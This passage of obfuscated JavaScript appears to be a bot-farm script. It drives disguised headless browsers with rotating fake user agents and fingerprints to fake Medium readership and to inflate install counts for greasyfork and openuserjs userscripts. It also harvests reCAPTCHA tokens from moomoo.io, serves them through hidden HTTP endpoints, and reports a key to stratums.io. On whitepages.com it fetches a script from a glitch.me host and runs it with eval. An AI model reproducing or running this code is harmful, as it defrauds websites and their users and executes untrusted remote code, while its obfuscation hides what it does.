      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + a2(0x1b) + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + a2(0x15) + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + Z(0x16, 'uPAL'),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    a2(0xc) + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1afb + -0x371 + -0xf36 * -0x2
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2 * 0x85 + 0x253d + 0x2647 * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xee + 0x846 * 0x2 + -0x12 * 0xf3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * 0x1c2d + 0x5dd * 0x6 + -0x3ef7), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1183 + -0x425 * 0x6 + -0x2a61 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1e95 * 0x1 + 0x26c7 + -0x832; w < getRandomInt(-0x4f * -0x4 + 0x13db + -0x1 * 0x1516, 0xc * -0xc6 + 0x71 * -0x52 + 0x2d7f); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x5ad * 0x7 + 0x77fa + 0x5 * 0xeef);
        }
      }();
    }, -0x270 + -0x12b5 + 0x1589), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x13 * 0x1ce + 0x484 * -0x7 + -0x2ae;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x85b + -0x1cf4 + 0x254f, 0x1a2c + -0x229 * 0x6 + -0xd04)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x3 * -0x1e07 + -0xbb5 + 0x2e * 0xd8);
    }, 0x15ff + 0x1932 + -0x2ecd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x2408 + -0x1ab4 + 0x2da * 0x16;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x782 + 0x1e6e + -0x1a38), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1823 + 0x22c4 + -0x3ae7), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x4f8 * -0x128 + 0x1319eb + -0x3 * 0x3b459);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xc * 0x97 + 0x16d8 + -0x1d88);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1ad4 + -0x2 * 0x1f3 + -0x1626);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1f7 * -0x5 + 0x19f7 + 0xf6c);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = b,
    a5 = d;
  async function f() {
    const a4 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xc1 + 0x3ca * 0x3 + 0x2 * -0x60f) {
        const a3 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x451 + 0x15ee + 0x4 * -0x467));
        const C = A['indexOf'](a3(0x13, 'NL@r')) + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1472 * -0x1 + 0x175 * -0x13 + -0x6d * -0x11, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1b7 + -0x5f * 0x33 + 0x2 * 0xa52, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4bb3 + 0x3dac + 0x3517),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3509 + -0xe2d * 0x5 + 0x4be * 0xc),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object[a4(0x4, 'z6gI')](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + a5(0x6) + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + a5(0x12) + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + a6(0x2, '5G]Q') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
